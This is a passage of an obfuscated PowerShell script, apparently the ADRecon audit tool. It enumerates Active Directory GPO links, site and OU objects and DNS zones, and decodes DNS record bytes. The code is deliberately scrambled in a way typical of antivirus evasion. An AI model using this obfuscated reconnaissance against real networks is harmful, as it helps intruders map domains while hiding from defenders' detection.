            ${gP`osO`Bj} =   (cHilDITEm ("vAriA"+"blE"+":oLxe")).vaLUE::("{0}{2}{1}"-f'GPOP','ser','ar').Invoke(${aDg`pos}, ${tH`REA`dS})
            &("{1}{3}{2}{0}{4}"-f'ab','R','ve-Vari','emo','le') ("{1}{0}{2}" -f 'GPO','AD','s')
        }
    }

    If (${g`Pos`oBJ})
    {
        Return ${gP`os`obj}
    }
    Else
    {
        Return ${nU`ll}
    }
}


Function G`eT-`A`drGpL`Ink
{

    param(
        [Parameter(mANdaToRY = ${TR`UE})]
        [string] ${mE`THOD},

        [Parameter(mAndAToRy = ${fA`lsE})]
        [DirectoryServices.DirectoryEntry] ${O`B`JDOmAiN},

        [Parameter(mAnDAtoRy = ${Tr`Ue})]
        [int] ${pAGesI`ZE} = 200,

        [Parameter(MAnDAtORy = ${F`Al`SE})]
        [int] ${th`ReA`Ds} = 10
    )

    If (${MeTH`Od} -eq ("{1}{0}"-f 'DWS','A'))
    {
        Try
        {
            ${aDsO`MS} = @( &("{1}{2}{0}" -f '-ADObject','Ge','t') -LDAPFilter ((("{12}{1}{7}{5}{6}{11}{9}{3}{0}{10}{4}{13}{2}{8}"-f 'tcla','Cq(ob','a','ec','s=orga','ass=','do','jectcl','lUnit))',')(obj','s','main','(I','nization')).("{1}{0}" -f 'ACe','REpL').Invoke('ICq','|')) -Properties ("{1}{3}{0}{2}"-f 'stinguishedNa','D','me','i'),("{1}{0}"-f 'e','Nam'),("{0}{2}{1}" -f'gPL','nk','i'),("{1}{2}{0}"-f'ns','gPOpti','o') )
            ${A`DSO`ms} += @( &("{1}{2}{3}{0}" -f'DObject','Ge','t','-A') -SearchBase "CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{0}{4}{2}{1}{3}" -f'(objectc','t','ass=si','e)','l') -Properties ("{1}{2}{0}{3}{4}" -f 'gu','Dist','in','ishe','dName'),("{0}{1}"-f 'Na','me'),("{0}{1}" -f 'gPLin','k'),("{1}{2}{0}"-f'ns','g','POptio') )
        }
        Catch
        {
            &("{1}{3}{2}{0}"-f 'g','Writ','Warnin','e-') ("{1}{6}{9}{12}{4}{11}{7}{10}{2}{0}{5}{3}{8}" -f'le','[Get-ADR','i',' O','r',' enumerating SOM','GPL','r w','bjects','ink] E','h','o','r')
            &("{1}{0}{2}"-f'er','Write-V','bose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`UlL}
        }

        Try
        {
            ${ad`Gpos} = @( &("{2}{0}{3}{1}"-f't','ct','Ge','-ADObje') -LDAPFilter (("{7}{10}{6}{4}{3}{2}{0}{9}{5}{8}{1}" -f 'oupPolicyC',')','gr','y=','gor','nta','te','(obje','iner','o','ctCa')) -Properties ("{1}{3}{0}{2}" -f'ay','Dis','Name','pl'),("{4}{2}{3}{5}{0}{1}" -f'dN','ame','ti','ng','Dis','uishe') )
        }
        Catch
        {
            &("{4}{1}{0}{2}{3}" -f'te','i','-','Warning','Wr') ("{10}{9}{2}{15}{17}{5}{6}{20}{8}{18}{7}{19}{12}{3}{13}{16}{0}{14}{4}{1}{11}" -f 'Ob','ct','i','a','e','or whi','le en','roupPol','erating ','PL','[Get-ADRG','s','yCont','iner','j','nk',' ','] Err','g','ic','um')
            &("{1}{3}{2}{0}"-f 'se','Write-V','rbo','e') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULl}
        }

        If ( (${a`DS`oMs}) -and (${A`dGpOs}) )
        {
            &("{0}{2}{1}{3}"-f 'Write-Ver','o','b','se') "[*] Total SOMs: $([ADRecon.ADWSClass]::ObjectCount($ADSOMs)) "
            ${sOmo`BJ} =  (VARIABlE ('9b'+'5P6') ).value::("{2}{1}{0}" -f 'r','arse','SOMP').Invoke(${aD`GPOS}, ${aDs`O`mS}, ${TH`R`eADs})
            &("{1}{4}{2}{3}{0}"-f 'ariable','R','ov','e-V','em') ("{1}{0}" -f'Ms','ADSO')
            &("{3}{2}{1}{0}{4}" -f 'ab','ari','e-V','Remov','le') ("{1}{0}"-f 'DGPOs','A')
        }
    }

    If (${mE`THoD} -eq ("{0}{1}"-f'LD','AP'))
    {
        ${A`d`sOMS} = @()
        ${OBJ`SEar`c`hER} = &("{1}{0}{2}" -f'O','New-','bject') ("{3}{2}{8}{4}{0}{6}{7}{1}{5}"-f 'i','Searche','stem','Sy','D','r','rectorySer','vices.Directory','.') ${ob`j`Do`MaIn}
        ${OBJ`sea`R`CHEr}."Pag`Esize" = ${p`Ag`ESizE}
        ${Ob`jse`ARCH`ER}."Fi`lTeR" = ((("{4}{1}{6}{11}{7}{10}{2}{9}{5}{12}{0}{3}{8}" -f'nalUn','tu(objectcl','ss=','it)','(Y','a','ass=','(objectc',')','org','la','domain)','nizatio'))-rEPLACe  'Ytu',[CHAr]124)
        ${OBj`sea`Rch`eR}."PRO`P`ER`TIEstOLOad".("{0}{2}{1}" -f 'AddR','nge','a').Invoke((("{2}{1}{0}{3}"-f'tingu','s','di','ishedname'),("{1}{0}"-f'ame','n'),("{1}{0}"-f'nk','gpli'),("{1}{0}" -f'ions','gpopt')))
        ${oBJS`eA`RcHeR}."sEA`RChSCO`pE" = ("{0}{1}{2}"-f 'S','u','btree')

        Try
        {
            ${a`d`SOMS} += ${OB`J`Sea`RcHeR}.("{0}{1}" -f 'Fin','dAll').Invoke()
        }
        Catch
        {
            &("{3}{2}{0}{1}"-f 'ite-','Warning','r','W') ("{2}{0}{6}{5}{1}{8}{10}{4}{7}{9}{3}"-f'G',' ','[Get-ADR','cts','er','r','PLink] Erro','ati','whil','ng SOM Obje','e enum')
            &("{0}{1}{2}" -f'Write-V','er','bose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`LL}
        }
        ${obJS`EARC`her}.("{0}{1}"-f 'dispos','e').Invoke()

        ${sE`ArC`Hp`ATH} = ("{1}{0}{2}"-f '=S','CN','ites')
        If (${cr`EdE`Nt`iAL} -ne  $CLF0N::"EmP`Ty")
        {
            ${ObJS`Ea`R`Ch`pATH} = &("{3}{2}{1}{0}"-f'ct','je','Ob','New-') ("{7}{3}{0}{1}{5}{4}{8}{2}{6}"-f 'oryS','e','oryE','Direct','i','rv','ntry','System.','ces.Direct') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", ${cr`ed`ENt`iAL}."UsernA`mE",${c`Re`dEnt`ial}.("{1}{0}{4}{3}{2}" -f'etNetwork','G','tial','eden','Cr').Invoke()."PAs`sWO`Rd"
        }
        Else
        {
            ${OB`JSEARcH`P`ATh} = &("{2}{1}{0}"-f 'ct','-Obje','New') ("{4}{2}{1}{0}{3}{6}{5}"-f 'e','t','ys','m.DirectoryServices.DirectoryEn','S','y','tr') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        ${o`BJsE`AR`CheR} = &("{0}{1}{2}"-f'New-O','bje','ct') ("{10}{4}{7}{5}{3}{2}{11}{6}{0}{1}{8}{9}"-f'Direct','oryS','v','r','m.Di','Se','ces.','rectory','earc','her','Syste','i') ${o`B`js`EarCHPath}
        ${Ob`jSE`Ar`cHER}."fi`l`TeR" = ("{0}{2}{3}{1}"-f '(objectclass','te)','=','si')
        ${obj`sEArcH`ER}."P`R`op`ErtIEs`TolOaD".("{1}{0}{2}"-f'dR','Ad','ange').Invoke((("{3}{1}{2}{0}" -f 'uishedname','istin','g','d'),("{1}{0}"-f'ame','n'),("{0}{1}{2}"-f'gpl','in','k'),("{0}{1}{2}" -f'gpopti','o','ns')))
        ${oBJ`s`earCh`er}."S`EaRcH`scOpE" = ("{0}{1}"-f 'S','ubtree')

        Try
        {
            ${Ad`So`MS} += ${O`B`jseaRCHeR}.("{0}{1}{2}"-f'Find','A','ll').Invoke()
        }
        Catch
        {
            &("{0}{3}{2}{1}" -f 'W','g','te-Warnin','ri') ("{8}{3}{5}{7}{1}{4}{6}{0}{2}"-f 'OM Obj','ile ','ects','t-ADRG','e','PL','numerating S','ink] Error wh','[Ge')
            &("{4}{0}{1}{2}{3}" -f'te-Ve','r','bos','e','Wri') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nU`ll}
        }
        ${Obj`SeaRc`H`ER}.("{2}{1}{0}"-f 'se','spo','di').Invoke()

        ${Ob`JseA`RchEr} = &("{0}{2}{1}" -f'N','bject','ew-O') ("{10}{1}{3}{7}{8}{4}{5}{9}{0}{2}{6}" -f 'ryS','ste','earche','m.','Services.D','ir','r','Direct','ory','ecto','Sy') ${OBj`DOmA`IN}
        ${O`Bj`seAR`chEr}."p`AgESi`ZE" = ${pa`ge`S`IzE}
        ${oBJs`earC`her}."FiL`TeR" = ("{3}{7}{1}{6}{5}{8}{4}{2}{0}{9}" -f 'cyContai','te','upPoli','(object','o','=','gory','Ca','gr','ner)')
        ${ob`JSea`RC`HER}."sea`R`cHSC`oPe" = ("{1}{0}{2}" -f'btr','Su','ee')

        Try
        {
            ${ad`gpoS} = ${OB`JS`EaRChEr}.("{1}{0}{2}" -f 'in','F','dAll').Invoke()
        }
        Catch
        {
            &("{1}{2}{0}{3}" -f'Warn','W','rite-','ing') ("{1}{4}{5}{2}{6}{11}{9}{3}{8}{10}{0}{7}{12}" -f 'o','[','or while enume','upP','Get','-ADRGPLink] Err','r','ntainer Object','olic',' gro','yC','ating','s')
            &("{3}{1}{0}{2}"-f 'Verbo','e-','se','Writ') "[EXCEPTION] $($_.Exception.Message) "
            Return ${NU`Ll}
        }
        ${obJ`searc`hEr}.("{0}{1}" -f 'disp','ose').Invoke()

        If ( (${aDs`O`ms}) -and (${Ad`GPoS}) )
        {
            &("{2}{1}{0}" -f 'Verbose','rite-','W') "[*] Total SOMs: $([ADRecon.LDAPClass]::ObjectCount($ADSOMs)) "
            ${SoM`obJ} =  (DiR  ('va'+'rIA'+'ble:OlX'+'e') ).vaLUe::("{1}{0}"-f'ser','SOMPar').Invoke(${AdG`pOS}, ${a`D`SOmS}, ${THR`E`Ads})
            &("{4}{1}{2}{0}{3}"-f'-Varia','m','ove','ble','Re') ("{0}{2}{1}"-f'ADS','s','OM')
            &("{3}{1}{0}{4}{2}"-f 'e-','emov','ariable','R','V') ("{1}{0}" -f 's','ADGPO')
        }
    }

    If (${s`om`Obj})
    {
        Return ${Som`O`BJ}
    }
    Else
    {
        Return ${nU`ll}
    }
}


Function C`o`NvErT`-dnSRECORD
{


    [OutputType({"{2}{4}{0}{11}{10}{1}{7}{9}{5}{8}{3}{6}"-f 'stem.','ment','S','.PSCustomOb','y','mat','ject','.Au','ion','to','ge','Mana'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTiOn = 0, MANdAtOrY = ${tr`Ue}, VAluEFrOMPiPeliNEbypropertynAme = ${t`RuE})]
        [Byte[]]
        ${D`NsRe`co`RD}
    )

    BEGIN {
        Function gEt-`NaME
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{4}{2}{1}{6}{5}" -f 'SUs','Corre','Type','P','eOutput','y','ctl'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${r`Aw}
            )

            [Int]${l`eNGth} = ${R`Aw}[0]
            [Int]${SEGme`N`TS} = ${R`AW}[1]
            [Int]${In`DEx} =  2
            [String]${nA`Me}  = ''

            while (${sEGmE`N`Ts}-- -gt 0)
            {
                [Int]${S`E`g`MentlEn`gtH} = ${R`Aw}[${in`Dex}++]
                while (${Se`GM`e`NTLENgTh}-- -gt 0)
                {
                    ${na`Me} += [Char]${R`Aw}[${i`Nd`ex}++]
                }
                ${nA`mE} += "."
            }
            ${Na`Me}
        }
    }

    PROCESS
    {
        
        ${Rd`AT`AtYpE} =   $1siq3R::("{1}{0}"-f '6','ToUInt1').Invoke(${Dn`sRe`C`OrD}, 2)
        ${u`p`dAteDaTSeR`IaL} =  $1SIQ3r::("{0}{1}{2}"-f 'To','UInt','32').Invoke(${d`NSrEc`orD}, 8)

        ${Ttl`Raw} = ${dN`Sr`eCorD}[12..15]

        
        ${n`UlL} =   (  get-itEm  ("VA"+"rIAblE:"+"r5Q")  ).vAluE::("{1}{0}" -f 'e','Revers').Invoke(${tT`L`RAW})
        ${T`TL} =  $1SiQ3r::("{2}{1}{0}"-f 'nt32','UI','To').Invoke(${Ttl`R`AW}, 0)

        ${A`ge} =   ( gCI  ('vaRiAB'+'LE:1S'+'iq3'+'R')  ).VAluE::("{1}{2}{0}"-f'32','ToU','Int').Invoke(${Dns`REc`orD}, 20)
        If (${a`Ge} -ne 0)
        {
            ${TimE`S`TAmP} = ((&("{0}{2}{1}" -f'G','t-Date','e') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{2}{0}{1}"-f 'u','rs','AddHo').Invoke(${a`GE})).("{0}{1}{2}"-f 'To','St','ring').Invoke()
        }
        Else
        {
            ${t`imeS`TaMp} = ("{2}{1}{0}"-f 'tatic]','s','[')
        }

        ${D`Ns`RECord`O`BjecT} = &("{0}{1}{2}"-f 'New-Ob','jec','t') ("{2}{0}{1}"-f'Objec','t','PS')

        switch (${R`dataTy`Pe})
        {
            1
            {
                ${I`p} = "{0}.{1}.{2}.{3}" -f ${DNSr`e`cOrD}[24], ${D`NS`RecORd}[25], ${dn`Sre`CoRd}[26], ${d`NsRe`CORd}[27]
                ${D`ATa} = ${Ip}
                ${dn`srECOR`DObjE`CT} | &("{0}{2}{1}"-f'Add-Me','er','mb') ("{3}{0}{1}{2}"-f 'otep','r','operty','N') ("{1}{2}{0}"-f 'dType','R','ecor') 'A'
            }

            2
            {
                ${N`SnAmE} = &("{2}{1}{0}" -f'Name','t-','Ge') ${d`Ns`RE`coRD}[24..${dns`R`EcoRd}."l`EngTh"]
                ${d`ATa} = ${nSn`AmE}
                ${dNSrEC`o`Rdo`BjecT} | &("{1}{0}{2}"-f'emb','Add-M','er') ("{1}{2}{0}"-f 'y','Noteproper','t') ("{2}{3}{0}{1}" -f'rdT','ype','Re','co') 'NS'
            }

            5
            {
                ${A`LiAs} = &("{1}{0}{2}"-f 't-Nam','Ge','e') ${DN`SR`EcO`RD}[24..${D`Ns`Record}."le`NG`Th"]
                ${da`Ta} = ${AlI`As}
                ${D`NsRecO`RD`Ob`JEcT} | &("{2}{0}{1}"-f'b','er','Add-Mem') ("{2}{1}{3}{0}"-f 'operty','e','Not','pr') ("{1}{2}{0}"-f 'cordType','R','e') ("{1}{0}" -f'E','CNAM')
            }

            6
            {
                ${pRIMA`R`yNs} = &("{2}{1}{0}" -f 't-Name','e','G') ${Dn`sR`eCord}[44..${DNSreC`o`RD}."L`eN`Gth"]
                ${ReS`pon`s`I`BLEpArTY} = &("{2}{1}{0}" -f'ame','et-N','G') ${dN`s`RECOrd}[$(46+${dn`sR`EcORd}[44])..${D`NsrE`cORD}."Leng`Th"]
                ${s`eRIa`Lraw} = ${dn`srEcO`RD}[24..27]
                
                ${N`UlL} =   $R5q::("{1}{0}" -f'e','Revers').Invoke(${sERi`A`lr`AW})
                ${s`eriAL} =   ( dIR  vARIAble:1sIQ3R  ).valUe::("{2}{0}{1}" -f'oUIn','t32','T').Invoke(${sE`RIALr`AW}, 0)

                ${REfrEs`h`RAw} = ${D`NSRE`CorD}[28..31]
                ${N`UlL} =   $R5Q::("{1}{0}{2}" -f 'e','Rev','rse').Invoke(${reFreS`H`RAW})
                ${r`ef`REsh} =  (iTEM ("VaR"+"IA"+"bLe:1S"+"iq3R")).VaLUe::("{1}{2}{0}" -f'2','ToUIn','t3').Invoke(${rEfr`ESh`R`Aw}, 0)

                ${rETR`YR`Aw} = ${d`NsrEco`Rd}[32..35]
                ${n`UlL} =   $r5q::("{2}{1}{0}"-f'e','s','Rever').Invoke(${re`TrY`RaW})
                ${Re`T`Ry} =  ( get-itEm  ('vARIab'+'Le'+':1'+'SiQ3R')  ).VaLue::("{1}{0}{2}" -f 'I','ToU','nt32').Invoke(${reT`Ry`RaW}, 0)

                ${eXPIre`S`R`AW} = ${dnsrE`C`oRd}[36..39]
                ${N`ULL} =  ( vaRIABlE  r5q  ).VAlue::("{2}{0}{1}" -f've','rse','Re').Invoke(${eX`p`iReSraw})
                ${Ex`Pires} =   $1siq3R::("{1}{0}{2}"-f'n','ToUI','t32').Invoke(${E`XPI`ReSRaW}, 0)

                ${m`iNT`TlRAW} = ${Dn`sr`eCoRd}[40..43]
                ${n`ULL} =  ( VariablE ("r"+"5Q") -ValUe)::("{2}{0}{1}"-f 'eve','rse','R').Invoke(${miNT`T`lrAw})
                ${Mi`NT`TL} =  ( vARIAblE  ("1sI"+"q3r")).VAlUE::("{0}{2}{1}"-f 'ToUIn','2','t3').Invoke(${mInT`TlR`AW}, 0)

                ${d`ATa} = "[" + ${s`E`RIAl} + "][" + ${pRiM`ArY`Ns} + "][" + ${ReSpo`NsiBlEP`AR`Ty} + "][" + ${r`EF`RESh} + "][" + ${rE`TrY} + "][" + ${eX`p`IRES} + "][" + ${mIN`TtL} + "]"
                ${DnSr`ecOr`D`OBject} | &("{1}{0}{2}"-f'e','Add-Memb','r') ("{2}{0}{1}"-f'pe','rty','Notepro') ("{1}{2}{0}" -f 'pe','Record','Ty') 'SOA'
            }

            12
            {
                ${p`Tr} = &("{0}{2}{1}"-f 'G','ame','et-N') ${D`NSR`ECOrd}[24..${DNsR`Ec`oRD}."LEnG`Th"]
                ${D`Ata} = ${p`Tr}
                ${dNsReco`Rdo`BJe`ct} | &("{1}{0}{2}"-f 'e','Add-Memb','r') ("{0}{2}{1}" -f'Not','rty','eprope') ("{0}{2}{1}"-f'Recor','Type','d') 'PTR'
            }

            13
            {
                [string]${CPU`Ty`pE} = ""
                [string]${OS`TYpE}  = ""
                [int]${sEgMen`T`LeN`Gth} = ${DNSr`ECO`RD}[24]
                ${I`Nd`EX} = 25
                while (${sEgME`Nt`le`NGtH}-- -gt 0)
                {
                    ${CP`U`TYpE} += [char]${DnS`REc`Ord}[${iND`Ex}++]
                }
                ${In`d`EX} = 24 + ${dn`sRE`Cord}[24] + 1
                [int]${SE`gMEN`TL`e`Ngth} = ${i`NDeX}++
                while (${Se`gM`EnTlenG`TH}-- -gt 0)
                {
                    ${OS`T`yPe} += [char]${d`NSrEc`Ord}[${i`NdEX}++]
                }
                ${D`ATa} = "[" + ${c`pu`TyPE} + "][" + ${o`ST`yPE} + "]"
                ${dnsrecor`D`ob`j`eCt} | &("{1}{2}{0}" -f'r','Ad','d-Membe') ("{0}{1}{2}" -f 'No','teprop','erty') ("{0}{1}{2}" -f'Rec','ordT','ype') ("{1}{0}"-f'INFO','H')
            }

            15
            {
                ${PRi`oR`ITyRAw} = ${dNs`R`EcorD}[24..25]
                
                ${N`ULl} =   $r5Q::("{1}{0}"-f 'e','Revers').Invoke(${PrIOR`iT`YrAW})
                ${pR`iORI`TY} =  (gI  vaRiable:1SiQ3r).VALuE::("{0}{2}{1}"-f 'T','nt16','oUI').Invoke(${Pr`IOrit`yr`Aw}, 0)
                ${M`XHosT}   = &("{0}{1}{2}"-f'Get-N','am','e') ${Dns`REc`oRd}[26..${dNSr`ecO`RD}."LEn`g`TH"]
                ${da`Ta} = "[" + ${P`Ri`OrITy} + "][" + ${m`Xh`ost} + "]"
                ${dnsReCor`D`oB`jEcT} | &("{2}{0}{1}" -f 'Mem','ber','Add-') ("{0}{1}{2}{3}"-f'Noteprop','e','r','ty') ("{2}{0}{1}{3}"-f 'd','T','Recor','ype') 'MX'
            }

            16
            {
                [string]${t`xT}  = ''
                [int]${SEg`MEN`TlEn`gtH} = ${DnSR`eC`OrD}[24]
                ${i`NdeX} = 25
                while (${sEGMe`N`TLeN`GTH}-- -gt 0)
                {
                    ${T`xT} += [char]${dn`s`ReCoRd}[${iND`EX}++]
                }
                ${D`ATA} = ${t`XT}
                ${DNsrECo`RdOb`j`ECt} | &("{1}{0}{2}{3}"-f'Me','Add-','m','ber') ("{1}{2}{0}" -f 'y','Noteprop','ert') ("{0}{2}{1}" -f 'Record','e','Typ') 'TXT'
            }

            28
            {
        		
                ${A`AAA} = ""
                for (${I} = 24; ${I} -lt 40; ${i}+=2)
                {
                    ${b`LoC`KRaw} = ${d`N`S`ReCORD}[${I}..$(${i}+1)]
                    
                    ${N`ULL} =  (Get-vAriABLe  ('r5'+'q') ).vAlUe::("{1}{0}"-f'verse','Re').Invoke(${BLo`ckR`Aw})
                    ${BL`oCK} =   (  Ls  VarIaBLE:1Siq3R).VAlUE::("{0}{2}{1}"-f'ToUI','6','nt1').Invoke(${bl`oC`k`RAW}, 0)
			        ${A`AAA} += (${B`LO`ck}).("{2}{1}{0}"-f'ng','oStri','T').Invoke('x4')
			        If (${i} -ne 38)
                    {
                        ${a`Aaa} += ':'
                    }
                }
                ${da`Ta} = ${AA`AA}
                ${dn`SR`e`cO`RDobjeCt} | &("{0}{1}{2}"-f 'Add-Me','mbe','r') ("{0}{1}{3}{2}"-f'No','tepr','rty','ope') ("{2}{0}{1}" -f 'ecordTy','pe','R') ("{0}{1}"-f'A','AAA')
            }

            33
            {
                ${PRiO`RIt`YrAW} = ${D`NSRE`coRD}[24..25]
                
                ${Nu`LL} =   ( lS varIaBLE:R5q).VALue::("{1}{0}"-f'rse','Reve').Invoke(${prI`oRi`TyRAW})
                ${Pr`IOri`Ty} =   ( ls  ("vAriabLE"+":1S"+"Iq3R") ).ValUE::("{0}{1}{2}"-f 'To','UI','nt16').Invoke(${PR`iorI`TYR`Aw}, 0)

                ${w`EighT`RaW} = ${d`NsRE`coRD}[26..27]
                ${N`Ull} =   (  chiLDItEm  ('vari'+'A'+'BLE:'+'R5q') ).VaLuE::("{1}{0}{2}" -f'ev','R','erse').Invoke(${We`I`gHtr`AW})
                ${wEI`G`HT} =  (VarIABlE ("1S"+"I"+"Q3r")  -valueO  )::("{1}{2}{0}"-f'nt16','ToU','I').Invoke(${weIg`h`TrAW}, 0)

                ${PoR`Tr`Aw} = ${Dn`SrE`c`ord}[28..29]
                ${n`UlL} =   ( VariAbLe  ("r"+"5q") -Valu )::("{1}{0}"-f 'e','Revers').Invoke(${po`Rtraw})
                ${pO`Rt} =  ( get-VARIAble  ("1sI"+"q3R")).vAluE::("{0}{2}{1}" -f 'ToUIn','16','t').Invoke(${po`Rtr`AW}, 0)

                ${sR`VHo`St} = &("{1}{0}" -f't-Name','Ge') ${dNSr`EcO`RD}[30..${dn`sREco`Rd}."le`NGtH"]
                ${dA`Ta} = "[" + ${pr`iOritY} + "][" + ${weIg`hT} + "][" + ${po`Rt} + "][" + ${Sr`VHoST} + "]"
                ${DNsR`EcOr`dO`B`jECt} | &("{0}{1}{2}"-f 'A','dd-M','ember') ("{2}{0}{1}{3}" -f'eprop','ert','Not','y') ("{2}{0}{3}{1}"-f 'cordT','pe','Re','y') 'SRV'
            }

            default
            {
                ${DA`TA} = $(  (vARIABlE dqIR4).value::"Tob`As`e64St`RIng"(${DnS`R`e`CoRD}[24..${dNSrEc`o`Rd}."Le`NgTH"]))
                ${d`Ns`RE`CoRD`obJEcT} | &("{2}{1}{0}"-f 'ember','dd-M','A') ("{0}{1}{2}{3}" -f'N','ot','ep','roperty') ("{1}{2}{0}"-f 'rdType','Rec','o') ("{0}{1}{2}" -f'UNK','NO','WN')
            }
        }
        ${dnsrE`C`orD`ob`ject} | &("{0}{2}{1}"-f 'A','d-Member','d') ("{2}{0}{1}"-f 't','y','Noteproper') ("{2}{1}{0}" -f'erial','edAtS','Updat') ${UPd`ATEDATS`ERIaL}
        ${d`N`SREcO`Rdo`B`jECT} | &("{1}{0}{2}"-f 'd-Memb','Ad','er') ("{3}{0}{2}{1}" -f'ot','property','e','N') 'TTL' ${T`Tl}
        ${dn`srEcO`RDo`BJe`CT} | &("{0}{1}{2}{3}" -f 'Ad','d','-Memb','er') ("{0}{2}{1}{3}" -f 'Not','er','eprop','ty') 'Age' ${a`Ge}
        ${DnsREc`oR`Do`B`J`eCT} | &("{2}{0}{3}{1}" -f '-','er','Add','Memb') ("{0}{1}{2}" -f'Notepro','pe','rty') ("{1}{2}{0}"-f 'tamp','Time','S') ${t`imeSt`AmP}
        ${Dn`SrECorDoB`jeCt} | &("{2}{0}{1}"-f'dd-Membe','r','A') ("{2}{0}{1}" -f'ert','y','Noteprop') ("{1}{0}"-f 'a','Dat') ${DA`TA}
        Return ${D`N`sRECorDOb`JE`Ct}
    }
}

Function Ge`T-adRDNS`Z`onE
{

    param(
        [Parameter(ManDATOrY = ${TR`UE})]
        [string] ${m`ETHod},

        [Parameter(MandatORy = ${f`Al`SE})]
        [DirectoryServices.DirectoryEntry] ${O`BJdo`MA`IN},

        [Parameter(ManDATOry = ${fa`lsE})]
        [string] ${dOmaiNc`OnT`R`o`ller},

        [Parameter(mAndAtorY = ${faL`Se})]
        [Management.Automation.PSCredential] ${cRE`DE`NTiaL} =  $ClF0N::"eM`Pty",

        [Parameter(mAndAtoRy = ${T`RUE})]
        [int] ${p`AgE`Si`zE} = 200,

        [Parameter(MAnDatoRy = ${Tr`Ue})]
        [string] ${ad`ROuT`PutdIR},

        [Parameter(MaNDatoRY = ${T`RUe})]
        [array] ${O`UTPU`TTYpE},

        [Parameter(MaNDATORy = ${fa`lse})]
        [bool] ${ad`Rd`NsZOn`es} = ${tr`UE},

        [Parameter(MAnDaTory = ${f`Al`sE})]
        [bool] ${A`Dr`DN`sRE`CoRdS} = ${fa`lsE}
    )

    If (${Me`TH`OD} -eq ("{0}{1}"-f 'A','DWS'))
    {
        Try
        {
            ${A`D`DnSzONES} = &("{1}{0}{2}" -f '-ADObj','Get','ect') -LDAPFilter ("{0}{1}{3}{2}" -f '(obj','ectCla','sZone)','ss=dn') -Properties ("{1}{0}" -f'me','Na'),("{0}{1}{2}{3}"-f 'whenCrea','t','e','d'),("{1}{0}{2}" -f 'ange','whenCh','d'),("{2}{0}{1}{3}"-f'n','cre','us','ated'),("{2}{1}{0}"-f 'anged','h','usnc'),("{4}{2}{0}{3}{1}{5}" -f'guis','nam','tin','hed','dis','e')
        }
        Catch
        {
            &("{2}{1}{0}{3}"-f 'e-War','it','Wr','ning') ("{8}{5}{0}{1}{9}{7}{3}{2}{12}{11}{6}{4}{10}"-f'et-ADR','D','hil','one] Error w','e','G','rating dnsZone Obj','SZ','[','N','cts',' enume','e')
            &("{2}{3}{0}{1}"-f'rb','ose','Writ','e-Ve') "[EXCEPTION] $($_.Exception.Message) "
        }

        ${d`NSzON`EArR`Ay} = @()
        If (${add`Ns`zoN`eS})
        {
            ${dn`Sz`OneARR`AY} += ${Ad`D`Ns`ZoNeS}
            &("{0}{2}{1}" -f'Remove-Vari','le','ab') ("{2}{3}{0}{1}"-f 'Zo','nes','AD','DNS')
        }

        Try
        {
            ${A`d`DomAIN} = &("{1}{2}{0}{3}" -f'ADDo','Ge','t-','main')
        }
        Catch
        {
            &("{0}{1}{3}{4}{2}" -f'Write-','Wa','ng','r','ni') ("{4}{3}{8}{1}{5}{6}{0}{7}{2}"-f ' ','ror ge','ain Context','et-ADRDNSZone] ','[G','tti','ng','Dom','Er')
            &("{0}{1}{3}{2}"-f'Wr','ite-','ose','Verb') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULl}
        }

        Try
        {
            ${aDD`Nsz`O`NEs1} = &("{2}{1}{0}"-f'ject','t-ADOb','Ge') -LDAPFilter (("{1}{3}{4}{2}{0}"-f'dnsZone)','(','ss=','objec','tCla')) -SearchBase "DC=DomainDnsZones,$($ADDomain.DistinguishedName)" -Properties ("{1}{0}" -f 'me','Na'),("{0}{2}{1}" -f'when','d','Create'),("{2}{1}{0}{3}" -f 'hange','henC','w','d'),("{1}{0}{2}" -f'ea','usncr','ted'),("{0}{2}{1}" -f 'u','d','snchange'),("{0}{2}{3}{4}{1}"-f 'distin','e','guish','e','dnam')
        }
        Catch
        {
            &("{1}{2}{0}{3}"-f'-Warni','Writ','e','ng') "[Get-ADRDNSZone] Error while enumerating DC=DomainDnsZones,$($ADDomain.DistinguishedName) dnsZone Objects "
            &("{2}{0}{3}{1}"-f 'r','-Verbose','W','ite') "[EXCEPTION] $($_.Exception.Message) "
        }
        If (${AdDNs`zOn`e`s1})
        {
            ${DnsZO`N`EAr`R`Ay} += ${aDdnsz`oNE`s1}
            &("{4}{1}{2}{3}{0}"-f 'able','m','ove','-Vari','Re') ("{2}{0}{1}" -f 's','1','ADDNSZone')
        }

        Try
        {
            ${a`ddnS`z`Ones2} = &("{1}{3}{2}{0}" -f't','G','-ADObjec','et') -LDAPFilter ("{2}{0}{1}{5}{4}{3}{6}"-f 'tC','l','(objec','Z','=dns','ass','one)') -SearchBase "DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=')" -Properties ("{0}{1}"-f'N','ame'),("{1}{2}{0}"-f 'eated','wh','enCr'),("{3}{2}{1}{0}"-f'ed','hang','nC','whe'),("{2}{0}{1}" -f 't','ed','usncrea'),("{3}{1}{2}{0}"-f 'd','a','nge','usnch'),("{0}{4}{3}{1}{2}" -f 'dis','d','name','inguishe','t')
        }
        Catch
        {
            &("{0}{3}{1}{2}"-f'W','ite-War','ning','r') "[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=') dnsZone Objects"
            &("{2}{4}{3}{1}{0}"-f 'se','bo','Wri','er','te-V') "[EXCEPTION] $($_.Exception.Message) "
        }
        If (${a`DdnSz`oN`es2})
        {
            ${d`NSZO`Nea`RRay} += ${a`DDN`sZoneS2}
            &("{0}{2}{4}{1}{3}"-f 'Rem','e-Variabl','o','e','v') ("{2}{0}{1}" -f'DDNSZon','es2','A')
        }

        If (${adD`oM`AIN})
        {
            &("{2}{0}{1}{3}"-f've','-Varia','Remo','ble') ("{1}{2}{0}"-f'Domain','A','D')
        }

